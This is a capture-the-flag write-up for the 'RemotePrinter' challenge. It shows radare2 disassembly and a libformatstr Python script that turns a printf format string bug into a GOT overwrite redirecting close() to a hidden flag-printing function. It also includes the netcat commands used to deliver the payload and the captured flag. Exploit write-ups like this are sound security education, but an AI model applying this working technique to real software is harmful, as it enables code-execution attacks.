## Solved by barrebas and superkojiman

This was a relatively easy one that barrebas and I solved at the same time. Let's examine the vulnerability first. We're given a binary called RemotePrinter. Running it prompts us for an IP address and a port to connect to, after which it waits to receive data from the "printer". We can simulate the printer using netcat and send back some data. In this case, we found that it was vulnerable to a format string attack:

```
# ./RemotePrinter 
This is a remote printer!
Enter IPv4 address:127.0.0.1
Enter port:6666
Thank you, I'm trying to print 127.0.0.1:6666 now!
AAAA.0xffa7179c.0x2000.(nil).(nil).(nil).(nil).0x41414141.0x2e70252e.0x252e7025.0x70252e70
```

It's clear that our format string can be found at offset 7. The simple solution was to overwrite a function's GOT pointer with one that we wanted. A closer examination of the binary revealed a file called "flag.txt" in the string dump:

```
[0x08048ad0]> iz
.
.
.
vaddr=0x080489de paddr=0x000009de ordinal=008 sz=9 len=8 section=.rodata type=ascii string=flag.txt
vaddr=0x080489e7 paddr=0x000009e7 ordinal=009 sz=15 len=14 section=.rodata type=ascii string=YAY, FLAG: %s\n
```

Where's this being referenced from?

```
[0x00000000]> axt 0x080489de
data 0x8048875 push str.flag.txt in unknown function
```

Some function that wasn't being called by anything. Digging deeper:

```
[0x00000000]> pd@0x8048875
            0x08048875      68de890408     push str.flag.txt           ; "flag.txt" @ 0x80489de
            0x0804887a      e8e1fcffff     call sym.imp.fopen
            0x0804887f      83c410         add esp, 0x10
            0x08048882      8945f4         mov dword [ebp - 0xc], eax
            0x08048885      83ec04         sub esp, 4
            0x08048888      ff75f4         push dword [ebp - 0xc]
            0x0804888b      6a32           push 0x32                   ; '2'
            0x0804888d      8d45c2         lea eax, [ebp - 0x3e]
            0x08048890      50             push eax
            0x08048891      e85afcffff     call sym.imp.fgets
            0x08048896      83c410         add esp, 0x10
            0x08048899      83ec0c         sub esp, 0xc
            0x0804889c      ff75f4         push dword [ebp - 0xc]
            0x0804889f      e85cfcffff     call sym.imp.fclose
            0x080488a4      83c410         add esp, 0x10
            0x080488a7      83ec08         sub esp, 8
            0x080488aa      8d45c2         lea eax, [ebp - 0x3e]
            0x080488ad      50             push eax
            0x080488ae      68e7890408     push str.YAY__FLAG:__s_n    ; "YAY, FLAG: %s." @ 0x80489e7
            0x080488b3      e828fcffff     call sym.imp.printf
            0x080488b8      83c410         add esp, 0x10
            0x080488bb      90             nop
            0x080488bc      c9             leave
            0x080488bd      c3             ret
```

The summarize the above function. Basically this function opens "flag.txt", reads the contents, and prints it back out to stdout. We can find where the function starts by subtracting some bytes from 0x808875 and looking for the function prologue:

```
[0x00000200]> pd -10@0x8048875
|           0x0804885c      e85ffdffff     call sym.imp.close
|           0x08048861      83c410         add esp, 0x10
|           0x08048864      90             nop
|           ; JMP XREF from 0x08048842 (fcn.08048786)
|           ; JMP XREF from 0x08048813 (fcn.08048786)
|           ; JMP XREF from 0x080487b9 (fcn.08048786)
|           0x08048865      c9             leave
\           0x08048866      c3             ret
            0x08048867      55             push ebp
            0x08048868      89e5           mov ebp, esp
            0x0804886a      83ec48         sub esp, 0x48
            0x0804886d      83ec08         sub esp, 8
            0x08048870      68dc890408     push 0x80489dc
```

There it is, 0x08048867. Now the format string bug occurs after it receives data from the printer, and calls printf() on it. This happens here: 

```
|    |||    0x0804884d      50             push eax                     ; buf
|    |||    0x0804884e      e88dfcffff     call sym.imp.printf          ; printf(buf)
|    |||    0x08048853      83c410         add esp, 0x10
|    |||    0x08048856      83ec0c         sub esp, 0xc
|    |||    0x08048859      ff75f4         push dword [ebp - 0xc]
|    |||    0x0804885c      e85ffdffff     call sym.imp.close           ; close()
```

Since close() is called right after printf(), it was a good candidate for overwriting. The goal was to overwrite close()'s GOT pointer to point to 0x08048867, which would print out the flag. 


### superkojiman's solution
I accomplished this with [libformatstr](https://github.com/hellman/libformatstr): 

```python
#!/usr/bin/env python

from libformatstr import *

win_addr = 0x8048867
close_got = 0x08049c80

p = FormatStr(100)
p[close_got] = win_addr

buf = ""
buf += p.payload(7)
open("in.txt", "w").write(buf)
```

This creates a file with the payload necessary to do the overwrite. I ran a netcat instance on my VPS that would feed this payload to RemotePrinter.

```
root@vps:~# nc -lvp 6666 < in.txt
listening on [any] 6666 ...
```

I then connected to it from the CTF's RemotePrinter: 

```
# nc 188.166.133.53 12377
This is a remote printer!
Enter IPv4 address:192.99.xxx.xxxx
Enter port:6666
Thank you, I'm trying to print 192.99.xxx.xxx:6666 now!
.
.
.
  AAA������������������������������������������������������������������YAY, FLAG: IW{YVO_F0RmaTt3d_RMT_Pr1nT3R}
``` 

Win! The flag is IW{YVO_F0RmaTt3d_RMT_Pr1nT3R}
